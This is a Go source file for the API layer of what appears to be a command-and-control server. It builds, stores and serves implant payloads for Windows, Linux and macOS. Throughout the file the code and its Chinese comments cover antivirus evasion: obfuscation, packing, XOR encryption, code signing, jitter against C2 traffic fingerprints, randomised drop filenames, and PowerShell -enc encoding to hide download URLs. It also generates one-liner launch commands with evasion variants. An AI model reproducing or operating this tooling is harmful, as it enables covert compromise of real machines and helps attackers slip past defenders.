package api

import (
	cryptorand "crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"
	"unicode/utf16"

	"github.com/gorilla/mux"
	"toshell/internal/server/builder"
	"toshell/internal/server/database"
	"toshell/internal/server/logging"
)

// effectiveImplantDefaults 返回「构建请求里对应字段留 0 时，服务端实际会用的值」。
// 生成载荷页把这些值显示成输入框的 placeholder，用户留空即等于"跟随设置页"。
// ⚠️ 这里的回退口径必须与 createBuilderHandler 中的归一化分支保持一致。
func (s *Server) effectiveImplantDefaults() map[string]uint32 {
	d := map[string]uint32{}
	if s.cfg != nil {
		d["interval"] = s.cfg.Implant.Interval
		d["jitter"] = s.cfg.Implant.Jitter
		d["retry_wait"] = s.cfg.Implant.RetryWait
		// 启动延迟在配置里是 int，且**没有"不延迟"的表示法**（<=0 一律视为未设置），
		// 这里原样复刻 builder.go 的归一化顺序，保证页面显示的值 = 真正烘焙进载荷的值。
		min, max := s.cfg.Implant.StartupDelayMin, s.cfg.Implant.StartupDelayMax
		if max < min {
			max = min
		}
		if max <= 0 {
			min, max = 2, 10
		}
		if min <= 0 {
			min = 2
		}
		d["startup_delay_min"] = uint32(min)
		d["startup_delay_max"] = uint32(max)
	}
	if d["interval"] == 0 {
		d["interval"] = 60
	}
	if d["jitter"] == 0 {
		d["jitter"] = 20
	}
	if d["retry_wait"] == 0 {
		d["retry_wait"] = 5
	}
	// retry_count 没有服务端配置项（设置页里也没有），回退值是硬编码的 3。
	d["retry_count"] = 3
	return d
}

func (s *Server) listBuildersHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	formats := []string{"exe", "dll", "shellcode", "shellcode_bin", "raw"}
	protocols := []string{"http", "https", "websocket", "mqtt"}
	osList := []string{"windows", "linux", "darwin"}
	archList := []string{"amd64", "386", "arm64"}

	garbleAvail, garbleMsg := false, ""
	upxAvail := false
	cAvail, cMessage := false, ""
	if s.builder != nil {
		garbleAvail, garbleMsg = s.builder.GarbleStatus()
		upxAvail = s.builder.UPXAvailable()
		cAvail, cMessage = s.builder.CStatus()
	}

	// Return real listeners from the database so the frontend can pick one
	// when generating a payload.
	listeners := []ListenerInfo{}
	if db := database.Get(); db != nil {
		if all, err := db.ListListeners(); err == nil {
			listeners = make([]ListenerInfo, 0, len(all))
			for _, l := range all {
				listeners = append(listeners, listToResponse(l))
			}
		}
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"formats":   formats,
		"protocols": protocols,
		"os":        osList,
		"arch":      archList,
		"listeners": listeners,
		"languages": map[string]interface{}{
			"go":        true,   // Go 植入端：全功能
			"c":         cAvail, // C 植入端：体积极小（~50KB），仅 Windows exe，基础功能
			"c_message": cMessage,
		},
		"options": map[string]interface{}{
			"interval": map[string]uint32{"min": 1, "max": 300, "default": 60},
			// 抖动默认 20%：心跳间隔随机化，避免"固定周期轮询"这种典型 C2 指纹
			"jitter":      map[string]uint32{"min": 0, "max": 100, "default": 20},
			"retry_count": map[string]uint32{"min": 0, "max": 10, "default": 3},
			"retry_wait":  map[string]uint32{"min": 1, "max": 60, "default": 5},
		},
		// 植入端默认参数 = 「设置 → 植入端默认参数」里配的值，且**按构建时的归一化规则算好**。
		// 生成载荷页对应输入框留空（前端发 0）时，服务端就用这里的值。前端把本字段当成
		// 输入框的 placeholder 显示，用户就不用"设置里配一遍、构建页再填一遍"了。
		// ⚠️ 改这里务必同步 createBuilderHandler 里的归一化分支（两处口径必须一致）。
		"implant_defaults": s.effectiveImplantDefaults(),
		"evasion": map[string]interface{}{
			"garble_available": garbleAvail,
			"garble_message":   garbleMsg,
			"upx_available":    upxAvail,
			// 代码签名能力（是否已配置证书、用的哪套签名栈），供生成载荷页展示与提示
			"sign_configured": func() bool {
				if s.builder == nil {
					return false
				}
				ok, _ := s.builder.SignStatus()
				return ok
			}(),
			"sign_message": func() string {
				if s.builder == nil {
					return ""
				}
				_, msg := s.builder.SignStatus()
				return msg
			}(),
			// BOF 默认关闭：需要跑 BOF 时在页面上勾选（会带上一整套 Beacon* API 名字）
			"bof_default": false,
			// DLL 载荷可用性：**按目标架构分别返回**（c-shared 需要与架构一致的 mingw gcc：
			// x64 要 x86_64-w64-mingw32-gcc。只有 i686 时前端应当场提示，而不是等构建失败）
			"dll_available": func() bool {
				ok, _ := builder.DLLStatus("amd64")
				return ok
			}(),
			"dll_message": func() string {
				_, msg := builder.DLLStatus("amd64")
				return msg
			}(),
			"dll_arch": func() map[string]interface{} {
				out := map[string]interface{}{}
				for _, a := range []string{"amd64", "386", "arm64"} {
					ok, msg := builder.DLLStatus(a)
					out[a] = map[string]interface{}{"available": ok, "message": msg}
				}
				return out
			}(),
		},
	})
}

func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != http.MethodPost {
		http.Error(w, `{"error":"Method not allowed"}`, http.StatusMethodNotAllowed)
		return
	}

	// 构建是长耗时操作（首次拉依赖 / garble 混淆 30~90s / UPX 压缩），
	// 默认的 server.write_timeout（30s）会在构建完成前掐断响应 —— 表现为客户端
	// "connection closed unexpectedly"，而服务端其实已经构建成功（日志可见
	// "Payload built"）。这里为本请求单独放宽写超时。
	if rc := http.NewResponseController(w); rc != nil {
		_ = rc.SetWriteDeadline(time.Now().Add(30 * time.Minute))
	}

	var req BuildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}

	if req.Name == "" {
		req.Name = fmt.Sprintf("implant-%d", time.Now().Unix())
	}
	if req.Format == "" {
		req.Format = "exe"
	}
	// 心跳间隔/抖动缺省值：**优先跟随服务端配置**（listener/implant 设置页），
	// 只有配置也没给才回退内置默认。旧实现硬编码 5s/2%，会把"设置页里配的
	// 60s 心跳"悄悄改回 5s —— 固定 5s 轮询是最典型的 C2 行为特征。
	if req.Interval == 0 {
		req.Interval = s.cfg.Implant.Interval
	}
	if req.Interval == 0 {
		req.Interval = 60
	}
	if req.Jitter == 0 {
		req.Jitter = s.cfg.Implant.Jitter
	}
	if req.Jitter == 0 {
		req.Jitter = 20 // 默认 ±20% 抖动：打破固定节奏的流量指纹
	}
	if req.RetryCount == 0 {
		req.RetryCount = 3
	}
	// 重试间隔同理：先跟随服务端配置（implant.retry_wait），配置也没给才回退 5s。
	// （此前这里直接硬编码 5，导致设置页把 retry_wait 配成别的值时不生效 ——
	//  与 effectiveImplantDefaults() 报给生成载荷页的 placeholder 对不上。）
	if req.RetryWait == 0 {
		req.RetryWait = s.cfg.Implant.RetryWait
	}
	if req.RetryWait == 0 {
		req.RetryWait = 5
	}

	s.applyListenerDefaults(&req)

	if req.ServerURL == "" {
		req.ServerURL = fmt.Sprintf("http://localhost:%d", s.cfg.Server.Port)
	}
	if req.Protocol == "" {
		req.Protocol = "http"
	}

	// 防呆：TCP 通道的 server_url 即使误带 http(s):// 前缀也自动剥离
	// （前缀会让植入端误判为 HTTP 轮询通道，而 TCP 监听器不是 HTTP 服务，
	// 导致注册失败反复重连）。
	// 注意：websocket 通道必须保留 ws:// 前缀（植入端据此选择 WS 传输），
	// 且 stripURLScheme 不处理 ws://（避免 "ws://host:port" 被截断成 "ws:"）。
	if req.Protocol == "tcp" {
		req.ServerURL = stripURLScheme(req.ServerURL)
	}

	opts := builder.BuildOptions{
		Format:       req.Format,
		Language:     req.Language,
		ListenerID:   req.ListenerID,
		ServerURL:    req.ServerURL,
		Protocol:     req.Protocol,
		Interval:     req.Interval,
		Jitter:       req.Jitter,
		RetryCount:   req.RetryCount,
		RetryWait:    req.RetryWait,
		KillDate:     req.KillDate,
		WorkingHours: req.WorkingHours,
		RelayListen:  req.RelayListen,
		FrontDomain:  req.FrontDomain,
		Profile:      req.Profile,
		OS:           req.OS,
		Arch:         req.Arch,
		// Evasion options
		XOREncrypt:   req.XOREncrypt,
		XORKeySize:   req.XORKeySize,
		GarbleEnable: req.GarbleEnable,
		UPXEnable:    req.UPXEnable,
		EvasionScan:  req.EvasionScan,
		BofEnabled:   req.BofEnabled,
		ExecModule:   req.ExecModule,
		SignEnabled:  req.SignEnabled,
		// DLL：导出名与"加载即启动"（仅 format=dll 生效；dll_autostart 缺省 true）
		DLLExport:    req.DLLExport,
		DLLAutoStart: req.DLLAutoStart == nil || *req.DLLAutoStart,
		// 启动随机延迟：0 = 交给 builder 取服务端配置 / 内置默认
		StartDelayMin: req.StartupDelayMin,
		StartDelayMax: req.StartupDelayMax,
	}

	result, err := s.builder.Build(opts)
	if err != nil {
		logging.Error("builder", "Build failed: %v", err)
		writeJSONError(w, http.StatusInternalServerError, err.Error())
		return
	}

	buildID := fmt.Sprintf("build-%d", time.Now().UnixNano())

	// 以唯一 ID 命名产物文件，避免同名载荷互相覆盖导致列表下载串文件。
	ext := payloadExt(req.Format, req.OS)
	filename := buildID
	if ext != "" {
		filename = buildID + "." + ext
	}

	// shellcode 格式保存/下载 hex 文本（每个字节转 2 个十六进制字符）。
	// 体积为原始字节的 2 倍，但兼容需要直接粘贴 hex 的使用场景；
	// Size 按实际下载文件大小计算，页面显示与下载一致。
	saveData := result.Binary
	if req.Format == "shellcode" {
		saveData = []byte(result.ShellcodeHex)
	}

	response := BuildResponse{
		ID:          buildID,
		Name:        req.Name,
		Format:      req.Format,
		Size:        len(saveData),
		SHA256:      result.SHA256,
		BuildTime:   result.BuildTime.Format(time.RFC3339),
		DownloadURL: fmt.Sprintf("/api/v1/implants/stored/%s", buildID),
	}
	// 代码签名结果：把"签没签上、谁签的、为什么没签"如实带回给前端与调用方
	if result.Sign != nil {
		response.Signed = result.Sign.Signed
		response.Signer = result.Sign.Signer
		response.SignMethod = result.Sign.Method
		response.SignStatus = result.Sign.Status
		response.SignMessage = result.Sign.Message
	}
	// 一键上线命令：地址由服务端按目标机可达性解析（见 oneliner.go），
	// 并一次性给出多套免杀变体（含加载器链），前端只负责展示。
	if set := s.oneLinerSet(r, req.ServerURL, req.OS, req.Format, buildID, req.DownloadHost); set != nil {
		response.OneLinerHost = set.Host
		response.OneLinerBase = set.BaseURL
		response.OneLinerWarning = set.Warning
		response.OneLiners = set.Variants
		if len(set.Variants) > 0 {
			response.OneLiner = set.Variants[0].Command
		}
	}

	// 落地链建议：按平台/格式 + 本次产物是否已签名，给出"该走哪条链、为什么"。
	// 依据是实测结论：未签名的新 PE 在装有 360/电脑管家的主机上会被拒绝执行并删除。
	targetOS := req.OS
	if targetOS == "" {
		targetOS = "windows"
	}
	adviceTitle, adviceTips := LoaderAdvice(targetOS, req.Format, response.Signed)
	response.LoaderAdviceTitle = adviceTitle
	response.LoaderAdviceTips = adviceTips

	implantDir := s.cfg.Implant.OutputDir
	if implantDir == "" {
		implantDir = "./implants"
	}
	if err := os.MkdirAll(implantDir, 0755); err == nil {
		if err := os.WriteFile(filepath.Join(implantDir, filename), saveData, 0755); err != nil {
			logging.Warn("builder", "Failed to save implant: %v", err)
		} else {
			logging.Info("builder", "Implant saved to: %s", filepath.Join(implantDir, filename))
		}
		// 移除 builder 按旧规则(名称)写入的副本，避免一次生成留下两个文件。
		// 必须按 builder 实际写盘的文件名（GetOutputFilename）精确删除，
		// 否则对 raw 等格式（builder 写无扩展名文件）会残留旧文件导致列表出现两条。
		_ = os.Remove(filepath.Join(implantDir, s.builder.GetOutputFilename(opts)))
		// 兜底：历史遗留的 name.ext 形式副本一并清理
		if req.Name != "" {
			oldName := req.Name
			if oldExt := payloadExt(req.Format, req.OS); oldExt != "" {
				oldName = req.Name + "." + oldExt
			}
			_ = os.Remove(filepath.Join(implantDir, oldName))
		}
	}

	// Save to database for persistent implant list
	if db := database.Get(); db != nil {
		now := time.Now().Unix()
		optsJSON, _ := json.Marshal(map[string]interface{}{
			"interval":          req.Interval,
			"jitter":            req.Jitter,
			"retry_count":       req.RetryCount,
			"retry_wait":        req.RetryWait,
			"kill_date":         req.KillDate,
			"working_hours":     req.WorkingHours,
			"xor_encrypt":       req.XOREncrypt,
			"garble":            req.GarbleEnable,
			"upx":               req.UPXEnable,
			"evasion_scan":      req.EvasionScan,
			"startup_delay_min": opts.StartDelayMin,
			"startup_delay_max": opts.StartDelayMax,
		})
		db.CreateImplant(&database.StoredImplant{
			ID:          response.ID,
			Name:        req.Name,
			Format:      req.Format,
			OS:          req.OS,
			Arch:        req.Arch,
			Protocol:    req.Protocol,
			ServerURL:   req.ServerURL,
			Size:        int64(len(saveData)),
			SHA256:      result.SHA256,
			Filename:    filename,
			CreatedAt:   now,
			OptionsJSON: string(optsJSON),
		})
	}

	logging.Info("builder", "Payload built: %s (%s)", req.Name, req.Format)

	json.NewEncoder(w).Encode(response)
}

// serveFileDownload 以流式方式返回磁盘文件(支持 Range 与断点续传),
// 避免大文件一次性读入内存。
func serveFileDownload(w http.ResponseWriter, r *http.Request, path, fallbackName string) {
	info, err := os.Stat(path)
	if err != nil {
		http.Error(w, `{"error":"file not found"}`, http.StatusNotFound)
		return
	}
	f, err := os.Open(path)
	if err != nil {
		http.Error(w, `{"error":"cannot open file"}`, http.StatusInternalServerError)
		return
	}
	defer f.Close()

	name := fallbackName
	if name == "" {
		name = filepath.Base(path)
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s", name))
	http.ServeContent(w, r, name, info.ModTime(), f)
}

// downloadPayloadHandler 只负责下载已构建好的载荷文件,绝不触发重新构建。
// 优先按请求中的 ID 精确匹配数据库记录;兼容旧调用按名称在磁盘上查找。
// 找不到时返回明确的错误,由前端引导用户先重新生成载荷。
func (s *Server) downloadPayloadHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/octet-stream")

	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req BuildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	// 优先按 ID 从数据库找到精确记录再下载,避免同名串文件。
	if req.ID != "" {
		if db := database.Get(); db != nil {
			if imp, err := db.GetImplant(req.ID); err == nil {
				s.serveStoredImplant(w, r, imp)
				return
			}
		}
	}

	// 兼容旧调用:按名称在磁盘上查找已存在的载荷文件。
	if req.Name != "" {
		implantDir := s.cfg.Implant.OutputDir
		if implantDir == "" {
			implantDir = "./implants"
		}
		exts := []string{req.Format, "exe", "dll", "bin", "txt", "raw", "so"}
		for _, ext := range exts {
			if ext == "" {
				continue
			}
			p := filepath.Join(implantDir, req.Name+"."+ext)
			if _, err := os.Stat(p); err == nil {
				serveFileDownload(w, r, p, "")
				return
			}
		}
	}

	// 下载是只读操作:找不到文件时直接报错,绝不在此重新编译。
	http.Error(w, `{"error":"未找到已构建的载荷文件，请先重新生成载荷后再下载"}`, http.StatusNotFound)
}

// randName 生成 n 位小写字母数字随机串，用于随机化载荷落地文件名，降低固定
// 文件名（如 svc.exe）被静态特征匹配的概率。
//
// 使用 crypto/rand：早期用 time.Now().UnixNano() 播种 math/rand，在同一毫秒内
// 连续调用会拿到相同种子，导致一次生成的多条上线命令落地文件名完全一样
// （Windows 时钟粒度下实测复现），削弱随机化意义。
func randName(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	if _, err := cryptorand.Read(b); err != nil {
		// crypto/rand 不可用（极罕见）时退回时间播种，保证功能可用。
		rng := rand.New(rand.NewSource(time.Now().UnixNano() + rand.Int63()))
		for i := range b {
			b[i] = letters[rng.Intn(len(letters))]
		}
		return string(b)
	}
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

// encodeUTF16LE 将字符串按 UTF-16LE 编码后做 Base64，供 powershell -enc 使用，
// 使下载 URL / 落地文件名 / API 名称在命令行中不可见。
func encodeUTF16LE(s string) string {
	u := utf16.Encode([]rune(s))
	b := make([]byte, len(u)*2)
	for i, v := range u {
		b[i*2] = byte(v)
		b[i*2+1] = byte(v >> 8)
	}
	return base64.StdEncoding.EncodeToString(b)
}

// applyListenerDefaults fills in ServerURL and Protocol from the selected
// listener (if any) so the built payload points at a real listener.
func (s *Server) applyListenerDefaults(req *BuildRequest) {
	if req.ListenerID == "" {
		return
	}
	db := database.Get()
	if db == nil {
		return
	}
	all, err := db.ListListeners()
	if err != nil {
		return
	}
	for _, l := range all {
		if l.ID != req.ListenerID {
			continue
		}
		// Prefer the public address when one is configured; otherwise fall back
		// to the bind address (with 0.0.0.0 mapped to localhost).
		host := l.PublicAddr
		if host == "" {
			host = l.BindAddr
			if host == "" || host == "0.0.0.0" {
				host = "localhost"
			}
		}
		scheme := "http"
		if l.Protocol == "https" {
			scheme = "https"
		} else if l.Protocol == "websocket" {
			scheme = "ws"
		} else if l.Protocol == "mqtt" {
			scheme = "mqtt"
		}
		if req.ServerURL == "" {
			req.ServerURL = fmt.Sprintf("%s://%s:%d", scheme, host, l.BindPort)
		}
		if req.Protocol == "" {
			req.Protocol = l.Protocol
		}
		return
	}
}

// listStoredImplantsHandler lists payloads that actually exist in the payload
// output directory, enriched with metadata from the database. Database records
// whose file no longer exists on disk are cleaned up automatically, so the
// list always reflects the real state of the payload directory.
func (s *Server) listStoredImplantsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	implantDir := s.cfg.Implant.OutputDir
	if implantDir == "" {
		implantDir = "./implants"
	}

	// 1. Snapshot the files currently present in the payload directory.
	files := make(map[string]os.FileInfo)
	if entries, err := os.ReadDir(implantDir); err == nil {
		for _, entry := range entries {
			if entry.IsDir() {
				continue
			}
			if info, err := entry.Info(); err == nil {
				files[entry.Name()] = info
			}
		}
	}

	// 2. Load DB records, keeping only those whose file still exists on disk.
	//    Orphan records (file deleted) are removed from the database.
	var implants []*database.StoredImplant
	if db := database.Get(); db != nil {
		if all, err := db.ListImplants(); err == nil {
			for _, imp := range all {
				if name, ok := s.locateImplantFile(files, imp); ok {
					imp.Filename = name
					implants = append(implants, imp)
				} else {
					logging.Warn("builder", "Cleaning up orphan implant record %s (%s): file not found on disk", imp.ID, imp.Name)
					_ = db.DeleteImplant(imp.ID)
				}
			}
		}
	}

	if implants == nil {
		implants = []*database.StoredImplant{}
	}

	// 3. Merge in files from the output directory that have no DB record.
	claimed := make(map[string]bool, len(implants))
	for _, imp := range implants {
		claimed[imp.Filename] = true
	}

	for name, info := range files {
		if claimed[name] {
			continue
		}
		ext := strings.TrimPrefix(filepath.Ext(name), ".")
		base := strings.TrimSuffix(name, filepath.Ext(name))
		osName := "windows"
		switch ext {
		case "so", "bin":
			osName = "linux"
		}
		// Untracked files use a synthetic ID so download/delete work.
		implants = append(implants, &database.StoredImplant{
			ID:        "file:" + name,
			Name:      base,
			Format:    ext,
			OS:        osName,
			Protocol:  "http",
			Size:      info.Size(),
			Filename:  name,
			CreatedAt: info.ModTime().Unix(),
		})
	}

	// Sort newest first (DB entries use Unix timestamps, file entries as well).
	sort.Slice(implants, func(i, j int) bool {
		return implants[i].CreatedAt > implants[j].CreatedAt
	})

	json.NewEncoder(w).Encode(map[string]interface{}{"implants": implants})
}

// payloadExt 返回与 builder.GetOutputFilename 一致的产物扩展名(不含点)。
func payloadExt(format, osName string) string {
	switch format {
	case "exe":
		return "exe"
	case "dll":
		return "dll"
	case "bin":
		if osName == "windows" {
			return "exe"
		}
		return ""
	case "so":
		return "so"
	case "shellcode":
		return "txt" // hex 文本
	case "shellcode_bin":
		return "bin"
	case "raw":
		return "raw"
	default:
		return ""
	}
}

// locateImplantFile finds the real file on disk for a DB record, mirroring the
// lookup used by serveStoredImplant. It returns the matching file name and true
// when the payload file actually exists in the directory. 只做精确匹配,
// 不再用名称前缀扫描,避免 "test" 匹配到 "test2.exe" 之类的串文件。
func (s *Server) locateImplantFile(files map[string]os.FileInfo, imp *database.StoredImplant) (string, bool) {
	if imp.Filename != "" {
		if _, ok := files[imp.Filename]; ok {
			return imp.Filename, true
		}
	}
	if imp.Name != "" {
		patterns := []string{
			imp.Name + "." + imp.Format,
			imp.Name + "." + payloadExt(imp.Format, imp.OS),
			imp.Name + ".exe",
			imp.Name + ".dll",
			imp.Name + ".bin",
			imp.Name + ".txt",
			imp.Name + ".so",
			imp.Name + ".raw",
		}
		for _, p := range patterns {
			if p != "" {
				if _, ok := files[p]; ok {
					return p, true
				}
			}
		}
	}
	return "", false
}

// serveStoredImplant 流式返回指定数据库记录对应的载荷文件。
// 优先使用记录中的唯一文件名;兼容旧记录按名称+格式精确回退。
// 下载名使用友好的 name.ext,磁盘上则是唯一 ID 文件名。
func (s *Server) serveStoredImplant(w http.ResponseWriter, r *http.Request, imp *database.StoredImplant) {
	implantDir := s.cfg.Implant.OutputDir
	if implantDir == "" {
		implantDir = "./implants"
	}

	candidates := []string{
		filepath.Join(implantDir, imp.Filename),
		filepath.Join(implantDir, imp.Name+"."+imp.Format),
		filepath.Join(implantDir, imp.Name+"."+payloadExt(imp.Format, imp.OS)),
		filepath.Join(implantDir, imp.Name+".exe"),
		filepath.Join(implantDir, imp.Name+".txt"),
	}

	var filePath string
	for _, p := range candidates {
		if p == "" {
			continue
		}
		if _, err := os.Stat(p); err == nil {
			filePath = p
			break
		}
	}

	if filePath == "" {
		http.Error(w, `{"error":"Implant file not found on disk"}`, http.StatusNotFound)
		return
	}

	dlName := imp.Name + filepath.Ext(filePath)
	if imp.Name == "" {
		dlName = filepath.Base(filePath)
	}
	serveFileDownload(w, r, filePath, dlName)
}

func (s *Server) downloadStoredImplantHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id := vars["id"]

	implantDir := s.cfg.Implant.OutputDir
	if implantDir == "" {
		implantDir = "./implants"
	}

	// Directory-only entries carry a "file:" prefixed synthetic ID.
	if strings.HasPrefix(id, "file:") {
		filePath := filepath.Join(implantDir, strings.TrimPrefix(id, "file:"))
		if _, err := os.Stat(filePath); os.IsNotExist(err) {
			http.Error(w, `{"error":"Implant file not found on disk"}`, http.StatusNotFound)
			return
		}
		serveFileDownload(w, r, filePath, "")
		return
	}

	db := database.Get()
	if db == nil {
		http.Error(w, `{"error":"Database not available"}`, http.StatusInternalServerError)
		return
	}

	imp, err := db.GetImplant(id)
	if err != nil {
		http.Error(w, `{"error":"Implant not found"}`, http.StatusNotFound)
		return
	}

	s.serveStoredImplant(w, r, imp)
}

func (s *Server) listImplantsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	implantDir := s.cfg.Implant.OutputDir
	if implantDir == "" {
		implantDir = "./implants"
	}

	var implants []ImplantsInfo

	entries, err := os.ReadDir(implantDir)
	if err != nil {
		if os.IsNotExist(err) {
			json.NewEncoder(w).Encode(map[string]interface{}{"implants": []interface{}{}})
			return
		}
		writeJSONError(w, http.StatusInternalServerError, err.Error())
		return
	}

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}

		info, err := entry.Info()
		if err != nil {
			continue
		}

		ext := filepath.Ext(entry.Name())
		implants = append(implants, ImplantsInfo{
			Name:    entry.Name(),
			Size:    info.Size(),
			ModTime: info.ModTime().Format(time.RFC3339),
			Format:  strings.TrimPrefix(ext, "."),
		})
	}

	sort.Slice(implants, func(i, j int) bool {
		return implants[i].ModTime > implants[j].ModTime
	})

	json.NewEncoder(w).Encode(map[string]interface{}{"implants": implants})
}

func (s *Server) downloadImplantHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	if name == "" {
		http.Error(w, `{"error":"Name is required"}`, http.StatusBadRequest)
		return
	}

	implantDir := s.cfg.Implant.OutputDir
	if implantDir == "" {
		implantDir = "./implants"
	}

	filePath := filepath.Join(implantDir, name)

	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		http.Error(w, `{"error":"File not found"}`, http.StatusNotFound)
		return
	}

	serveFileDownload(w, r, filePath, name)
}

func (s *Server) deleteStoredImplantHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	implantDir := s.cfg.Implant.OutputDir
	if implantDir == "" {
		implantDir = "./implants"
	}

	// Directory-only entries carry a "file:" prefixed synthetic ID; only the
	// file on disk is removed, there is no DB record to clean up.
	if strings.HasPrefix(id, "file:") {
		filePath := filepath.Join(implantDir, strings.TrimPrefix(id, "file:"))
		if err := os.Remove(filePath); err != nil && !os.IsNotExist(err) {
			writeJSONError(w, http.StatusInternalServerError, err.Error())
			return
		}
		json.NewEncoder(w).Encode(map[string]interface{}{
			"message": "Implant file deleted",
			"id":      id,
		})
		return
	}

	db := database.Get()
	if db == nil {
		http.Error(w, `{"error":"Database not available"}`, http.StatusInternalServerError)
		return
	}

	imp, err := db.GetImplant(id)
	if err != nil {
		http.Error(w, `{"error":"Implant not found"}`, http.StatusNotFound)
		return
	}

	// Delete file from disk
	filePath := filepath.Join(implantDir, imp.Filename)
	os.Remove(filePath)

	// Delete from database
	if err := db.DeleteImplant(id); err != nil {
		writeJSONError(w, http.StatusInternalServerError, err.Error())
		return
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"message": "Implant deleted",
		"id":      id,
	})
}

// stripURLScheme 剥离 server_url 的 http(s):// 前缀（保留 host:port）。
// 用于 TCP 通道防呆：避免前缀误导植入端选择 HTTP 轮询通道。
// 注意：不处理 ws:// 前缀（websocket 通道需保留，且此函数不匹配它）。
func stripURLScheme(addr string) string {
	a := strings.TrimSpace(addr)
	for _, p := range []string{"https://", "http://"} {
		if strings.HasPrefix(a, p) {
			a = a[len(p):]
			break
		}
	}
	// 去掉尾部路径
	if i := strings.Index(a, "/"); i >= 0 {
		a = a[:i]
	}
	return a
}
